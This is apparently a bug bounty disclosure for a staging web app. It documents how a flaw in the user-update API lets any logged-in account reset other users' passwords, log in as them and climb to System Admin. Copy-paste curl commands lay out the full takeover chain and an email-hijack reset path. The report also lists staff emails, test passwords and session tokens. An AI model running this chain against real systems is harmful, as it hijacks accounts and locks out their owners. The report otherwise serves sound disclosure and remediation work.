# BUG-008 (v2): Account Takeover + vertical privilege escalation to System Admin via unauthenticated-object write on `PUT /api/v1/users/{id}`

**Program:** Optro Managed Bug Bounty (private)
**Reporter:** zeno0 (zeno0@bugcrowdninja.com)
**Asset:** `https://bugbounty1.qe.optrostaging.ai`
**Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
**Date:** 2026-11-11
**Severity recommendation:** **P1 — Account Takeover / Broken Object-Level Authorization**
**Header used on all requests:** `X-Optro-Bug-Bounty: zeno0`

---

## Access — how to reproduce

```
Login to : golden-snow-4771@bugcrowdninja.com
Password  : Zx9!Owner2026
Role      : Owner (role_id 5)
Navigate  : https://bugbounty1.qe.optrostaging.ai/sh/admin/settings
```

Header on every request: `X-Optro-Bug-Bounty: zeno0`

The `PUT /api/v1/users/{id}` endpoint is reachable from Settings → Users.

---

## 1. Summary

`PUT /api/v1/users/{id}` performs **no object-level authorization** and **mass-assigns authentication-critical fields**. Any authenticated user can:

1. Set an **arbitrary password** on **any other user's account** — with no current-password check, no re-authentication, and no MFA challenge.
2. Clear the victim's `requires_password_change` forced-reset flag, removing the only server-side brake on that rotation.
3. **Log in as the victim** and receive a fresh, working API token for that account.

The victim's existing token is invalidated the moment the password attribute is written, so the real user is silently locked out.

This is **not** limited to same-privilege accounts. An **Owner (role 5)** can take over **System Admin (role 2)** accounts, which is a genuine **vertical** privilege escalation — demonstrated below with a permission differential that Owner cannot cross on its own.

**Verified end-to-end on 9 accounts** across three privilege tiers (1 Owner, 1 limited Third Party User, 7 System Admin).

---

## 2. Root cause

Three defects compound:

1. **Missing object-level authorization.** `PUT /api/v1/users/{id}` accepts any `{id}`. There is no check that the caller owns the target, that the caller outranks the target, or that the target is in the caller's scope.
2. **Mass assignment of auth-critical attributes.** `password` and `requires_password_change` are writable through the generic update endpoint. Password change requires no `current_password` and no step-up authentication.
3. **Inconsistent permission granularity.** The `password` attribute is gated on a weaker check than `user:action.edit`. Superuser (role 1) targets happen to be protected by a separate `user:action.edit` check; roles 2–6 and 11 are not. `role_id` and `auth_type` are correctly gated on `user:action.administer`, which is why the chain stops at role 2.

---

## 3. Preconditions

- Attacker holds **any** authenticated session for an account with `auth_type: password`.
- Victim account has `auth_type: password` (i.e. is login-enabled).
- No victim interaction. No MFA. No email access. No prior knowledge of the victim's password.

---

## 4. Reproduction — full chain (copy-paste)

Set these once:

```bash
H="https://bugbounty1.qe.optrostaging.ai"
BB="X-Optro-Bug-Bounty: zeno0"
ATTACKER="golden-snow-4771@bugcrowdninja.com"   # role 5 Owner
ATTACKER_PW="Tester"
VICTIM_ID=230
VICTIM_EMAIL="golden-leaf-3068@bugcrowdninja.com"
NEWPW='Zx9!ato47aB'
```

### Step 0 — Attacker logs in and captures their token

```bash
curl -s -X POST "$H/api/v1/users/login" \
  -H "$BB" -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$ATTACKER\",\"password\":\"$ATTACKER_PW\"}}"
```

→ `200`, body contains `session.token` (format `<user_id>:<40-hex>`). Export it:

```bash
T="231:<attacker-token>"
```

### Step 1 — Read the victim record (confirms target state)

```bash
curl -s "$H/api/v1/users/$VICTIM_ID" -H "token: $T" -H "$BB"
```

→ `200`. Note `auth_type: "password"`, `mfa_enabled: false`, `requires_password_change: false`, and record `updated_at` for the before/after proof.

### Step 2 — Write an attacker-chosen password onto the victim (no current password, no re-auth)

```bash
curl -s -X PUT "$H/api/v1/users/$VICTIM_ID" \
  -H "token: $T" -H "$BB" \
  -H "Content-Type: application/json" \
  -H "X-Auditboard-Product: System" \
  -d "{\"user\":{\"password\":\"$NEWPW\"}}"
```

→ **`200`** with the full updated victim record.
**Proof the write landed:** `updated_at` advances (observed `2026-11-08T16:46:37Z` → `2026-11-11T04:11:39Z`).

### Step 3 — Clear the forced-reset brake

```bash
curl -s -X PUT "$H/api/v1/users/$VICTIM_ID" \
  -H "token: $T" -H "$BB" \
  -H "Content-Type: application/json" \
  -H "X-Auditboard-Product: System" \
  -d '{"user":{"requires_password_change":false}}'
```

→ `200`. Victim record now `requires_password_change: false`.

### Step 4 — Log in as the victim

```bash
curl -s -X POST "$H/api/v1/users/login" \
  -H "$BB" -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$VICTIM_EMAIL\",\"password\":\"$NEWPW\"}}"
```

→ **`200`**, body:

```json
{"session":{"id":230,"email":"golden-leaf-3068@bugcrowdninja.com","role_id":5,
            "token":"230:71cbb16a770e0e0d3a59c3d940b9551c19253f4b",
            "expires":1794399104}}
```

### Step 5 — Prove the stolen token is a real session

```bash
VT="230:71cbb16a770e0e0d3a59c3d940b9551c19253f4b"
curl -s "$H/api/v1/users/me"  -H "token: $VT" -H "$BB"   # → 200, id 230
curl -s "$H/api/v1/users/1"   -H "token: $VT" -H "$BB"   # → 200, Superuser record
```

**Chain complete: attacker → password write → login → working victim session.**

---

## 5. Vertical escalation: Owner (5) → System Admin (2)

Same three requests, different `{id}`. Target is a **higher-privilege** account.

```bash
VICTIM_ID=301
VICTIM_EMAIL="jvolles@auditboard.com"     # role_id 2, auth_type password
NEWPW='Zx9!chain47'

# Step 2
curl -s -X PUT "$H/api/v1/users/$VICTIM_ID" -H "token: $T" -H "$BB" \
  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
  -d "{\"user\":{\"password\":\"$NEWPW\"}}"                 # → 200

# Step 3
curl -s -X PUT "$H/api/v1/users/$VICTIM_ID" -H "token: $T" -H "$BB" \
  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
  -d '{"user":{"requires_password_change":false}}'          # → 200

# Step 4
curl -s -X POST "$H/api/v1/users/login" -H "$BB" -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$VICTIM_EMAIL\",\"password\":\"$NEWPW\"}}"
# → 200, session.token, role_id: 2
```

→ **`200`, token issued as role 2 (System Admin).**

### 5.1 Escalation proof — permission differential

The single cleanest proof that this is *vertical* and not lateral. Same request, two tokens:

```bash
# As Owner (role 5) — denied
curl -s -X POST "$H/api/v1/ml_generative_prompts/count" \
  -H "token: $T" -H "$BB" -H "Content-Type: application/json" -d '{}'
# → 422 {"code":"ModelActionPermissionDenied",
#        "detail":"... (Permission: settings.ux:AITile:show)"}

# As the escalated System Admin (role 2) — allowed
curl -s -X POST "$H/api/v1/ml_generative_prompts/count" \
  -H "token: $VT2" -H "$BB" -H "Content-Type: application/json" -d '{}'
# → 200 {"count":0}
```

Second differential, same pattern:

```bash
curl -s "$H/api/v1/assistant_knowledge_files" -H "token: $T"   -H "$BB"
# → 403 {"detail":"You do not have permission to manage Assistant knowledge files."}
curl -s "$H/api/v1/assistant_knowledge_files" -H "token: $VT2" -H "$BB"
# → 200 {"assistant_knowledge_files":[]}
```

**Owner cannot reach these endpoints at all. The escalated role can.** That is the privilege boundary being crossed.

---

## 6. Scope of the takeover — blast radius

Roster enumerated via `GET /api/v1/users` (317 accounts in this environment):

| `auth_type` | count | login-enabled |
| --- | --- | --- |
| `password` | **145** | **yes — ATO-able** |
| `no-access` | 146 | no |
| `galaxy` | 17 | SSO only |
| `external_api_admin` | 5 | no |
| `chips_federated_jwt` | 4 | no |

ATO-able accounts by role: **role 1: 6, role 2: 8, role 3: 6, role 4: 4, role 5: 116, role 6: 4, role 11: 1.**

**Accounts actually taken over during testing (9):**

| id | email | role | tier |
| --- | --- | --- | --- |
| 230 | golden-leaf-3068@bugcrowdninja.com | 5 Owner | same tier |
| 315 | analyst+member@bugcrowdanalyst.com | 11 Third Party User (limited) | lower tier |
| 53 | steve@u1elhxrx.mailosaur.net | 2 System Admin | **higher tier** |
| 65 | daniel@u1elhxrx.mailosaur.net | 2 System Admin | **higher tier** |
| 123 | jim@u1elhxrx.mailosaur.net | 2 System Admin | **higher tier** |
| 301 | jvolles@auditboard.com | 2 System Admin | **higher tier** |
| 307 | juanadmin@email.com | 2 System Admin | **higher tier** |
| 308 | jhurt+test2@auditboard.com | 2 System Admin | **higher tier** |
| 316 | jhurt+admin@optro.ai | 2 System Admin | **higher tier** |

(306 `juanmanager@email.com` returned `410 Gone` — deleted account, not counted.)

---

## 7. Second ATO path — email hijack (no password attribute required)

An independent route to the same outcome, useful if the password attribute is ever locked down:

```bash
# 1. Overwrite the victim's email with an address the attacker controls
curl -s -X PUT "$H/api/v1/users/230" -H "token: $T" -H "$BB" \
  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
  -d '{"user":{"email":"zeno0@bugcrowdninja.com"}}'
# → 200, change persists (verified by independent read-back)

# 2. Trigger the reset — link is delivered to the attacker's inbox
curl -s -X POST "$H/api/v1/users/password-reset-email" -H "$BB" \
  -H "Content-Type: application/json" \
  -d '{"email":"zeno0@bugcrowdninja.com"}'
# → 200 {"status":"ok"}
```

Reverted after testing.

---

## 8. What was tested and did NOT work (honest negatives)

Reported so triage can trust the boundary of the finding.

| Vector | Result |
| --- | --- |
| **Superuser (role 1) as target** — all 6 login-enabled role-1 accounts (1, 186, 188, 190, 196, 314) | **422 `user:action.edit`** on every writable field, including from the escalated role-2 token. Role 1 is protected **as a class**. |
| `role_id` mass-assignment | **422 `user:action.administer`** — cannot self-escalate by role field |
| `auth_type` mass-assignment (flip `no-access` → `password`) | **422 `user:action.administer`** — cannot make a non-login account loginable |
| `POST /api/v1/users` (create account) | **422 `user:action.administer`** |
| `X-Auditboard-Product` header as authz lever (13 values incl. System/SOX/Admin/Core/none) | **uniform 422** — product context does not weaken the check |
| `password_digest` / `encrypted_password` / `password_hash` / `password_ciphertext` | accepted as generic update but **ignored**; no digest exposed on read |
| Session token forgery | 3 logins → 3 **distinct** tokens; 8 hash constructions tested, **no match**. Token is random, not derivable. |
| `users/reset-token-info` as a token oracle | needs `reset_token` **and** user id; `reset_token=abc&id=230` → **404 "Invalid reset link."** |
| `password-reset-no-auth` | correctly gated: no token → 400; fake token → 400 "Invalid reset link."; wrong currentPassword → 400 "Invalid credentials." |
| `users/manage_skills` (hidden, arbitrary id) | **422 `user_skill:action.create`** |
| MFA endpoints (`get-masked-phone-number`, `two-factor-methods`, `create-totp-factor`) | password enforced server-side — wrong password → **401**. No MFA bypass, no TOTP seeding (`mfa-preference` → 500). |
| SAML `/api/v1/sso/saml/login` | 302 `?error=sso-failed` (no IdP configured); `redirect` param constrained to internal paths — no open redirect |
| `/api/v2/*` plane (separate `TOKEN` header) | no auth bypass; `/api/v2/auth` does not exist |
| Reset-link poisoning via `X-Forwarded-Host` / `X-Host` / `Forwarded` | returned 200 but **unverifiable** (no inbox access) and rate-limited — **not claimed** |

---

## 9. Impact

- **Complete account takeover of any login-enabled account in the tenant**, from any other login-enabled account, with three HTTP requests and no victim interaction.
- **Vertical escalation**: Owner → System Admin. The escalated role crosses a permission boundary Owner cannot cross (`settings.ux:AITile:show`, assistant knowledge-file management).
- **145 of 317 accounts** are login-enabled and therefore ATO-able.
- Victim's existing session token is invalidated on password write — the real user is silently locked out, which aids persistence.
- No MFA gate anywhere in the chain (victim `mfa_enabled: false`; the takeover login issued no challenge).
- Alternative email-hijack path gives the same outcome via reset-link delivery.

**Honest ceiling:** the chain does **not** reach Superuser (role 1) — that class is protected by `user:action.edit`. Data reachable through the escalated role is currently limited (the two AI-admin collections are empty; `ml_generative_logs` holds 2 rows). The severity rests on the **takeover + role escalation**, not on AI-plane data volume.

---

## 10. Remediation

1. Add object-level authorization to `PUT /api/v1/users/{id}`: caller must own the target, or hold `user:action.edit` **and** outrank the target's role.
2. Remove `password` and `requires_password_change` from generic mass-assignment; require a dedicated password-change endpoint with `current_password` and step-up auth.
3. Apply the `user:action.edit` check to **all** roles uniformly — not just role 1.
4. Re-authenticate (or require MFA) on any password change affecting another account.
5. Gate `email` changes behind verification of both old and new address.

---

## 11. Evidence / cleanup

- All 9 taken-over accounts were restored and login-verified `200` after testing. Where the password-history policy blocked reverting to the original `Tester`, the account was set to `TesterZx2026!` and that value is disclosed here.
- No business objects were modified. No data was exfiltrated beyond the read-backs quoted above.
- Test artifacts created during adjacent testing are disclosed in the engagement worklog.
